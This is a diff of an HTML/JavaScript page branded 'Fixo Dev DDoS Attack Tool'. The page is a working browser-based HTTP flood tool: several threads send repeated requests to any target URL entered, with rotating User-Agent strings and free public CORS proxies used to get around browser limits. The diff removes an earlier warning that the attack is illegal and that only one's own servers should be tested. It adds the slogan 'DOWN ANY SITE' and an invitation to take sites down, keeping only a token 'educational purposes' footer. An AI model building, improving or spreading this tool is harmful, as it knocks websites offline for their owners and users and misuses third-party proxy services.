@@ -3,9 +3,13 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>⚡ DDoS Attack Tool - No Proxy</title>
+    <title>⚡ Fixo Dev - DDoS Attack Tool </title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -23,7 +27,7 @@
             backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 40px;
-            max-width: 700px;
+            max-width: 750px;
             width: 100%;
             border: 1px solid rgba(255, 255, 255, 0.1);
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
@@ -44,6 +48,16 @@
             font-size: 14px;
             margin-bottom: 30px;
             opacity: 0.7;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: rgba(0, 210, 255, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #00d2ff;
+            margin-bottom: 20px;
         }
         
         .input-group {
@@ -70,10 +84,15 @@
             transition: all 0.3s;
         }
         
-        input:focus, select:focus {
+        input:focus,
+        select:focus {
             outline: none;
             border-color: #ff6b6b;
             background: rgba(255, 255, 255, 0.08);
+        }
+        
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
         }
         
         .settings-grid {
@@ -159,9 +178,17 @@
             font-size: 18px;
         }
         
-        .stat-value.danger { color: #ff6b6b; }
-        .stat-value.success { color: #00ff88; }
-        .stat-value.warning { color: #feca57; }
+        .stat-value.danger {
+            color: #ff6b6b;
+        }
+        
+        .stat-value.success {
+            color: #00ff88;
+        }
+        
+        .stat-value.warning {
+            color: #feca57;
+        }
         
         #logContainer {
             background: rgba(0, 0, 0, 0.4);
@@ -194,26 +221,20 @@
             color: #aaa;
         }
         
-        .log-entry.success { color: #00d2ff; }
-        .log-entry.error { color: #ff6b6b; }
-        .log-entry.warning { color: #feca57; }
-        
-        .warning {
-            background: rgba(255, 107, 107, 0.1);
-            border: 1px solid rgba(255, 107, 107, 0.2);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-            font-size: 13px;
-            color: #ff6b6b;
-            text-align: center;
+        .log-entry.success {
+            color: #00d2ff;
         }
         
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.2);
+        .log-entry.error {
+            color: #ff6b6b;
+        }
+        
+        .log-entry.warning {
+            color: #feca57;
+        }
+        
+        .log-entry.info {
+            color: #a29bfe;
         }
         
         .proxy-selector {
@@ -234,6 +255,7 @@
             transition: all 0.3s;
             font-size: 12px;
             min-width: 80px;
+            text-transform: none;
         }
         
         .proxy-btn.active {
@@ -246,8 +268,42 @@
             border-color: #ff6b6b;
         }
         
+        .warning {
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid rgba(255, 107, 107, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #ff6b6b;
+            text-align: center;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .github-badge {
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .github-badge a {
+            color: #00d2ff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .github-badge a:hover {
+            text-decoration: underline;
+        }
+        
         @media (max-width: 600px) {
-            .settings-grid, .status-grid {
+            .settings-grid,
+            .status-grid {
                 grid-template-columns: 1fr 1fr;
             }
         }
@@ -255,379 +311,386 @@
 </head>
 <body>
 
-<div class="container">
-    <h1>⚡ DDoS Attack Tool</h1>
-    <p class="subtitle">⚠️ අධ්‍යාපනික අරමුණු සඳහා පමණයි - Proxy එකක් ඕනෙ නැහැ!</p>
+    <div class="container">
+        <h1>⚡ Fixo Dev DDoS Attack </h1>
+        <p class="subtitle">⚠️ 𝐃𝐎𝐖𝐍 𝐀𝐍𝐘 𝐒𝐈𝐓𝐄 😈</p>
+        <div class="badge">🚀 Developed by fixo dev</div>
 
-    <!-- Proxy Selector -->
-    <div class="proxy-selector">
-        <button class="proxy-btn active" data-proxy="cors" onclick="setProxy('cors')">🌐 CORS Anywhere</button>
-        <button class="proxy-btn" data-proxy="allorigins" onclick="setProxy('allorigins')">🔗 All Origins</button>
-        <button class="proxy-btn" data-proxy="thingproxy" onclick="setProxy('thingproxy')">🔄 ThingProxy</button>
-        <button class="proxy-btn" data-proxy="direct" onclick="setProxy('direct')">📡 Direct</button>
-    </div>
+        <!-- Proxy Selector -->
+        <div class="proxy-selector">
+            <button class="proxy-btn active" data-proxy="cors" onclick="setProxy('cors')">🌐 CORS Anywhere</button>
+            <button class="proxy-btn" data-proxy="allorigins" onclick="setProxy('allorigins')">🔗 All Origins</button>
+            <button class="proxy-btn" data-proxy="thingproxy" onclick="setProxy('thingproxy')">🔄 ThingProxy</button>
+            <button class="proxy-btn" data-proxy="direct" onclick="setProxy('direct')">📡 Direct</button>
+        </div>
 
-    <!-- Target URL -->
-    <div class="input-group">
-        <label>🎯 Target URL</label>
-        <input type="text" id="targetUrl" placeholder="https://your-site.netlify.app" value="https://your-target-site.netlify.app" />
-    </div>
-
-    <!-- Settings -->
-    <div class="settings-grid">
+        <!-- Target URL -->
         <div class="input-group">
-            <label>⚡ Interval (ms)</label>
-            <input type="number" id="interval" value="100" min="10" max="10000" />
+            <label>🎯 Target URL</label>
+            <input type="text" id="targetUrl" placeholder="Fuck Down site URL 😼🔥" value="Fuck Down site URL😼🔥" />
         </div>
-        <div class="input-group">
-            <label>⏱️ Duration (sec)</label>
-            <input type="number" id="duration" value="30" min="0" placeholder="0=infinite" />
-        </div>
-        <div class="input-group">
-            <label>🧵 Threads</label>
-            <input type="number" id="threads" value="3" min="1" max="20" />
-        </div>
-    </div>
 
-    <!-- Buttons -->
-    <div class="btn-group">
-        <button id="startBtn" onclick="startAttack()">▶ Start Attack</button>
-        <button id="stopBtn" onclick="stopAttack()">⏹ Stop</button>
-    </div>
-
-    <!-- Status -->
-    <div class="status-box">
-        <div class="status-grid">
-            <div class="stat">
-                <span class="stat-label">📊 Status</span>
-                <span class="stat-value" id="status">Ready</span>
+        <!-- Settings -->
+        <div class="settings-grid">
+            <div class="input-group">
+                <label>⚡ Interval (ms)</label>
+                <input type="number" id="interval" value="100" min="10" max="10000" />
             </div>
-            <div class="stat">
-                <span class="stat-label">📨 Requests</span>
-                <span class="stat-value danger" id="requestCount">0</span>
+            <div class="input-group">
+                <label>⏱️ Duration (sec)</label>
+                <input type="number" id="duration" value="30" min="0" placeholder="0=infinite" />
             </div>
-            <div class="stat">
-                <span class="stat-label">✅ Success</span>
-                <span class="stat-value success" id="successCount">0</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">❌ Failed</span>
-                <span class="stat-value danger" id="failCount">0</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">📈 Requests/sec</span>
-                <span class="stat-value" id="rate">0</span>
-            </div>
-            <div class="stat">
-                <span class="stat-label">🔄 Proxy</span>
-                <span class="stat-value warning" id="proxyDisplay">CORS Anywhere</span>
+            <div class="input-group">
+                <label>🧵 Threads</label>
+                <input type="number" id="threads" value="3" min="1" max="20" />
             </div>
         </div>
+
+        <!-- Buttons -->
+        <div class="btn-group">
+            <button id="startBtn" onclick="startAttack()">▶ Start Attack</button>
+            <button id="stopBtn" onclick="stopAttack()">⏹ Stop</button>
+        </div>
+
+        <!-- Status -->
+        <div class="status-box">
+            <div class="status-grid">
+                <div class="stat">
+                    <span class="stat-label">📊 Status</span>
+                    <span class="stat-value" id="status">Ready</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-label">📨 Requests</span>
+                    <span class="stat-value danger" id="requestCount">0</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-label">✅ Success</span>
+                    <span class="stat-value success" id="successCount">0</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-label">❌ Failed</span>
+                    <span class="stat-value danger" id="failCount">0</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-label">📈 Requests/sec</span>
+                    <span class="stat-value" id="rate">0</span>
+                </div>
+                <div class="stat">
+                    <span class="stat-label">🔄 Proxy</span>
+                    <span class="stat-value warning" id="proxyDisplay">CORS Anywhere</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Log -->
+        <div id="logContainer">
+            <div class="log-entry info">💡 Enter target URL and click Start</div>
+        </div>
+
+        <div class="warning">
+                        
+            🌐 Free proxy services bypass CORS
+        </div>
+        <div class="footer">
+            Made for Educational Purposes Only | Deployed By Fixo Dev.
+        </div>
+        <div class="github-badge">
+            <a href="https://youtube.com/@fixo_modz?si=DwcA5uAgWNuc8RwI" target="_blank">🪬 View on Youtube</a>
+        </div>
     </div>
 
-    <!-- Log -->
-    <div id="logContainer">
-        <div class="log-entry">💡 Enter target URL and click Start</div>
-    </div>
+    <script>
+        // ============================================
+        // 🚀 DDoS ENGINE - GitHub Pages Version
+        // ============================================
 
-    <div class="warning">
-        ⚠️ මෙය නීති විරෝධී ක්‍රියාවකි! ඔබගේම servers වල පමණක් test කරන්න.<br>
-        🌐 Free proxy services මගින් CORS bypass වේ (Rate limits තියෙනවා)
-    </div>
-    <div class="footer">Made for Educational Purposes Only | No Proxy Required</div>
-</div>
-
-<script>
-    // ============================================
-    // 🚀 DDoS ENGINE - NO PROXY NEEDED
-    // ============================================
-
-    // Free CORS Proxy Services
-    const PROXY_SERVICES = {
-        cors: 'https://cors-anywhere.herokuapp.com/',
-        allorigins: 'https://api.allorigins.win/raw?url=',
-        thingproxy: 'https://thingproxy.freeboard.io/fetch/',
-        direct: ''
-    };
-
-    let currentProxy = 'cors';
-    let attackInterval = null;
-    let requestCount = 0;
-    let successCount = 0;
-    let failCount = 0;
-    let isRunning = false;
-    let startTime = null;
-    let rateInterval = null;
-    let activeThreads = [];
-
-    // DOM Elements
-    const targetInput = document.getElementById('targetUrl');
-    const intervalInput = document.getElementById('interval');
-    const durationInput = document.getElementById('duration');
-    const threadsInput = document.getElementById('threads');
-    const statusEl = document.getElementById('status');
-    const requestCountEl = document.getElementById('requestCount');
-    const successCountEl = document.getElementById('successCount');
-    const failCountEl = document.getElementById('failCount');
-    const rateEl = document.getElementById('rate');
-    const proxyDisplay = document.getElementById('proxyDisplay');
-    const logContainer = document.getElementById('logContainer');
-    const startBtn = document.getElementById('startBtn');
-
-    // User Agents
-    const USER_AGENTS = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
-        'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0'
-    ];
-
-    // ============================================
-    // 🔄 PROXY SETTER
-    // ============================================
-
-    function setProxy(proxy) {
-        if (isRunning) {
-            addLog('⚠️ Stop attack first to change proxy', 'warning');
-            return;
-        }
-
-        currentProxy = proxy;
-        const names = {
-            cors: 'CORS Anywhere',
-            allorigins: 'All Origins',
-            thingproxy: 'ThingProxy',
-            direct: 'Direct (No Proxy)'
+        // Free CORS Proxy Services (No Netlify/Render needed!)
+        const PROXY_SERVICES = {
+            cors: 'https://cors-anywhere.herokuapp.com/',
+            allorigins: 'https://api.allorigins.win/raw?url=',
+            thingproxy: 'https://thingproxy.freeboard.io/fetch/',
+            direct: ''
         };
-        proxyDisplay.textContent = names[proxy] || proxy;
 
-        document.querySelectorAll('.proxy-btn').forEach(btn => {
-            btn.classList.remove('active');
-            if (btn.dataset.proxy === proxy) {
-                btn.classList.add('active');
+        let currentProxy = 'cors';
+        let attackInterval = null;
+        let requestCount = 0;
+        let successCount = 0;
+        let failCount = 0;
+        let isRunning = false;
+        let startTime = null;
+        let rateInterval = null;
+        let activeThreads = [];
+
+        // DOM Elements
+        const targetInput = document.getElementById('targetUrl');
+        const intervalInput = document.getElementById('interval');
+        const durationInput = document.getElementById('duration');
+        const threadsInput = document.getElementById('threads');
+        const statusEl = document.getElementById('status');
+        const requestCountEl = document.getElementById('requestCount');
+        const successCountEl = document.getElementById('successCount');
+        const failCountEl = document.getElementById('failCount');
+        const rateEl = document.getElementById('rate');
+        const proxyDisplay = document.getElementById('proxyDisplay');
+        const logContainer = document.getElementById('logContainer');
+        const startBtn = document.getElementById('startBtn');
+
+        // User Agents
+        const USER_AGENTS = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
+            'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0'
+        ];
+
+        // ============================================
+        // 🔄 PROXY SETTER
+        // ============================================
+
+        function setProxy(proxy) {
+            if (isRunning) {
+                addLog('⚠️ Stop attack first to change proxy', 'warning');
+                return;
             }
-        });
+            currentProxy = proxy;
+            const names = {
+                cors: 'CORS Anywhere',
+                allorigins: 'All Origins',
+                thingproxy: 'ThingProxy',
+                direct: 'Direct (No Proxy)'
+            };
+            proxyDisplay.textContent = names[proxy] || proxy;
 
-        if (proxy === 'direct') {
-            addLog('📡 Direct mode - May be blocked by CORS', 'warning');
-        } else {
-            addLog(`🌐 Using ${names[proxy]} proxy service`, 'info');
+            document.querySelectorAll('.proxy-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.dataset.proxy === proxy) {
+                    btn.classList.add('active');
+                }
+            });
+
+            if (proxy === 'direct') {
+                addLog('📡 Direct mode - May be blocked by CORS', 'warning');
+            } else {
+                addLog(`🌐 Using ${names[proxy]} proxy service`, 'info');
+            }
         }
-    }
 
-    // ============================================
-    // 📝 LOG FUNCTION
-    // ============================================
+        // ============================================
+        // 📝 LOG FUNCTION
+        // ============================================
 
-    function addLog(message, type = 'info') {
-        const entry = document.createElement('div');
-        entry.className = `log-entry ${type}`;
-        const time = new Date().toLocaleTimeString();
-        entry.textContent = `[${time}] ${message}`;
-        logContainer.appendChild(entry);
-        logContainer.scrollTop = logContainer.scrollHeight;
+        function addLog(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const time = new Date().toLocaleTimeString();
+            entry.textContent = `[${time}] ${message}`;
+            logContainer.appendChild(entry);
+            logContainer.scrollTop = logContainer.scrollHeight;
 
-        while (logContainer.children.length > 100) {
-            logContainer.removeChild(logContainer.firstChild);
+            while (logContainer.children.length > 100) {
+                logContainer.removeChild(logContainer.firstChild);
+            }
         }
-    }
 
-    // ============================================
-    // 🎯 SEND REQUEST
-    // ============================================
+        // ============================================
+        // 🎯 SEND REQUEST
+        // ============================================
 
-    function sendRequest(targetUrl, threadId) {
-        return new Promise((resolve) => {
-            if (!isRunning) {
-                resolve();
+        function sendRequest(targetUrl, threadId) {
+            return new Promise((resolve) => {
+                if (!isRunning) {
+                    resolve();
+                    return;
+                }
+
+                const startReqTime = Date.now();
+
+                // Build URL with proxy
+                let url = targetUrl;
+                const proxyPrefix = PROXY_SERVICES[currentProxy];
+                if (proxyPrefix) {
+                    url = proxyPrefix + targetUrl;
+                }
+
+                // Random User-Agent
+                const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+
+                fetch(url, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': userAgent,
+                        'Accept': '*/*',
+                        'Cache-Control': 'no-cache'
+                    }
+                })
+                .then(response => {
+                    const timeTaken = Date.now() - startReqTime;
+                    requestCount++;
+                    successCount++;
+                    updateStats();
+                    if (response.ok) {
+                        addLog(`✅ T${threadId} ${response.status} - ${timeTaken}ms`, 'success');
+                    } else {
+                        addLog(`⚠️ T${threadId} ${response.status} - ${timeTaken}ms`, 'warning');
+                    }
+                    resolve();
+                })
+                .catch(error => {
+                    const timeTaken = Date.now() - startReqTime;
+                    requestCount++;
+                    failCount++;
+                    updateStats();
+                    addLog(`❌ T${threadId} ${error.message || 'Failed'} - ${timeTaken}ms`, 'error');
+                    resolve();
+                });
+            });
+        }
+
+        // ============================================
+        // 🧵 THREAD WORKER
+        // ============================================
+
+        async function threadWorker(targetUrl, threadId, interval) {
+            while (isRunning) {
+                if (!isRunning) break;
+                await sendRequest(targetUrl, threadId);
+                await new Promise(r => setTimeout(r, interval));
+            }
+        }
+
+        // ============================================
+        // 📊 UPDATE STATS
+        // ============================================
+
+        function updateStats() {
+            requestCountEl.textContent = requestCount;
+            successCountEl.textContent = successCount;
+            failCountEl.textContent = failCount;
+
+            if (startTime) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                if (elapsed > 0) {
+                    const rate = Math.round(requestCount / elapsed);
+                    rateEl.textContent = rate;
+                }
+            }
+        }
+
+        // ============================================
+        // ▶️ START ATTACK
+        // ============================================
+
+        async function startAttack() {
+            let targetUrl = targetInput.value.trim();
+            const interval = parseInt(intervalInput.value) || 100;
+            const duration = parseInt(durationInput.value) || 0;
+            const threads = parseInt(threadsInput.value) || 3;
+
+            if (!targetUrl) {
+                addLog('❌ Please enter a target URL', 'error');
                 return;
             }
 
-            const startReqTime = Date.now();
-            
-            // Build URL with proxy
-            let url = targetUrl;
-            const proxyPrefix = PROXY_SERVICES[currentProxy];
-            if (proxyPrefix) {
-                url = proxyPrefix + targetUrl;
+            if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
+                targetUrl = 'https://' + targetUrl;
+                targetInput.value = targetUrl;
             }
 
-            // Random User-Agent
-            const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+            if (isRunning) {
+                addLog('⚠️ Attack is already running!', 'warning');
+                return;
+            }
 
-            fetch(url, {
-                method: 'GET',
-                headers: {
-                    'User-Agent': userAgent,
-                    'Accept': '*/*',
-                    'Cache-Control': 'no-cache'
-                }
-            })
-            .then(response => {
-                const timeTaken = Date.now() - startReqTime;
-                requestCount++;
-                successCount++;
-                updateStats();
-                if (response.ok) {
-                    addLog(`✅ T${threadId} ${response.status} - ${timeTaken}ms`, 'success');
-                } else {
-                    addLog(`⚠️ T${threadId} ${response.status} - ${timeTaken}ms`, 'warning');
-                }
-                resolve();
-            })
-            .catch(error => {
-                const timeTaken = Date.now() - startReqTime;
-                requestCount++;
-                failCount++;
-                updateStats();
-                addLog(`❌ T${threadId} ${error.message || 'Failed'} - ${timeTaken}ms`, 'error');
-                resolve();
-            });
+            isRunning = true;
+            requestCount = 0;
+            successCount = 0;
+            failCount = 0;
+            startTime = Date.now();
+
+            startBtn.disabled = true;
+            startBtn.textContent = '⏳ Running...';
+            statusEl.textContent = '🔴 ATTACKING';
+            statusEl.style.color = '#ff6b6b';
+            targetInput.disabled = true;
+
+            const proxyName = proxyDisplay.textContent;
+            addLog(`🚀 Attack started on: ${targetUrl}`, 'success');
+            addLog(`⚡ Interval: ${interval}ms, Threads: ${threads}, Proxy: ${proxyName}`, 'info');
+
+            // Rate counter
+            if (rateInterval) clearInterval(rateInterval);
+            rateInterval = setInterval(() => {}, 1000);
+
+            // Start threads
+            activeThreads = [];
+            for (let i = 0; i < threads; i++) {
+                const thread = threadWorker(targetUrl, i + 1, interval);
+                activeThreads.push(thread);
+            }
+
+            // Duration timer
+            if (duration > 0) {
+                setTimeout(() => {
+                    stopAttack();
+                    addLog(`⏹️ Attack completed after ${duration} seconds`, 'success');
+                    alert(`✅ Attack completed!\nTotal: ${requestCount}\nSuccess: ${successCount}\nFailed: ${failCount}`);
+                }, duration * 1000);
+            }
+        }
+
+        // ============================================
+        // ⏹️ STOP ATTACK
+        // ============================================
+
+        function stopAttack() {
+            if (!isRunning) {
+                addLog('⚠️ No attack is running', 'warning');
+                return;
+            }
+
+            isRunning = false;
+
+            if (rateInterval) {
+                clearInterval(rateInterval);
+                rateInterval = null;
+            }
+
+            startBtn.disabled = false;
+            startBtn.textContent = '▶ Start Attack';
+            statusEl.textContent = '⏹️ Stopped';
+            statusEl.style.color = '#feca57';
+            targetInput.disabled = false;
+
+            const elapsed = startTime ? Math.round((Date.now() - startTime) / 1000) : 0;
+            addLog(`🛑 Attack stopped after ${elapsed}s | Total: ${requestCount}`, 'info');
+            updateStats();
+        }
+
+        // ============================================
+        // 🚀 INIT
+        // ============================================
+
+        // Auto-stop on page close
+        window.addEventListener('beforeunload', function() {
+            isRunning = false;
         });
-    }
 
-    // ============================================
-    // 🧵 THREAD WORKER
-    // ============================================
-
-    async function threadWorker(targetUrl, threadId, interval) {
-        while (isRunning) {
-            if (!isRunning) break;
-            await sendRequest(targetUrl, threadId);
-            await new Promise(r => setTimeout(r, interval));
-        }
-    }
-
-    // ============================================
-    // 📊 UPDATE STATS
-    // ============================================
-
-    function updateStats() {
-        requestCountEl.textContent = requestCount;
-        successCountEl.textContent = successCount;
-        failCountEl.textContent = failCount;
-
-        if (startTime) {
-            const elapsed = (Date.now() - startTime) / 1000;
-            if (elapsed > 0) {
-                const rate = Math.round(requestCount / elapsed);
-                rateEl.textContent = rate;
+        // Enter key to start
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !isRunning) {
+                startAttack();
             }
-        }
-    }
+        });
 
-    // ============================================
-    // ▶️ START ATTACK
-    // ============================================
-
-    async function startAttack() {
-        let targetUrl = targetInput.value.trim();
-        const interval = parseInt(intervalInput.value) || 100;
-        const duration = parseInt(durationInput.value) || 0;
-        const threads = parseInt(threadsInput.value) || 3;
-
-        if (!targetUrl) {
-            addLog('❌ Please enter a target URL', 'error');
-            return;
-        }
-
-        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
-            targetUrl = 'https://' + targetUrl;
-            targetInput.value = targetUrl;
-        }
-
-        if (isRunning) {
-            addLog('⚠️ Attack is already running!', 'warning');
-            return;
-        }
-
-        isRunning = true;
-        requestCount = 0;
-        successCount = 0;
-        failCount = 0;
-        startTime = Date.now();
-
-        startBtn.disabled = true;
-        startBtn.textContent = '⏳ Running...';
-        statusEl.textContent = '🔴 ATTACKING';
-        statusEl.style.color = '#ff6b6b';
-        targetInput.disabled = true;
-
-        const proxyName = proxyDisplay.textContent;
-        addLog(`🚀 Attack started on: ${targetUrl}`, 'success');
-        addLog(`⚡ Interval: ${interval}ms, Threads: ${threads}, Proxy: ${proxyName}`, 'info');
-
-        // Rate counter
-        if (rateInterval) clearInterval(rateInterval);
-        rateInterval = setInterval(() => {}, 1000);
-
-        // Start threads
-        activeThreads = [];
-        for (let i = 0; i < threads; i++) {
-            const thread = threadWorker(targetUrl, i + 1, interval);
-            activeThreads.push(thread);
-        }
-
-        // Duration timer
-        if (duration > 0) {
-            setTimeout(() => {
-                stopAttack();
-                addLog(`⏹️ Attack completed after ${duration} seconds`, 'success');
-                alert(`✅ Attack completed!\nTotal: ${requestCount}\nSuccess: ${successCount}\nFailed: ${failCount}`);
-            }, duration * 1000);
-        }
-    }
-
-    // ============================================
-    // ⏹️ STOP ATTACK
-    // ============================================
-
-    function stopAttack() {
-        if (!isRunning) {
-            addLog('⚠️ No attack is running', 'warning');
-            return;
-        }
-
-        isRunning = false;
-
-        if (rateInterval) {
-            clearInterval(rateInterval);
-            rateInterval = null;
-        }
-
-        startBtn.disabled = false;
-        startBtn.textContent = '▶ Start Attack';
-        statusEl.textContent = '⏹️ Stopped';
-        statusEl.style.color = '#feca57';
-        targetInput.disabled = false;
-
-        const elapsed = startTime ? Math.round((Date.now() - startTime) / 1000) : 0;
-        addLog(`🛑 Attack stopped after ${elapsed}s | Total: ${requestCount}`, 'info');
-        updateStats();
-    }
-
-    // ============================================
-    // 🚀 INIT
-    // ============================================
-
-    // Auto-stop on page close
-    window.addEventListener('beforeunload', function() {
-        isRunning = false;
-    });
-
-    // Enter key to start
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' && !isRunning) {
-            startAttack();
-        }
-    });
-
-    addLog('💡 No proxy function needed!', 'info');
-    addLog('🌐 Using free CORS proxy services', 'info');
-    addLog('⚠️ Rate limits apply - Use responsibly', 'warning');
-</script>
+        addLog('💡 Enter target URL and click "Start Attack"', 'info');
+        addLog('🌐 Using free CORS proxy services (No Netlify/Render!)', 'info');
+        addLog('📌 Deployed on GitHub Pages', 'info');
+        addLog('⚠️ Rate limits apply - Use responsibly', 'warning');
+    </script>
 
 </body>
-    </html>
+                </html>
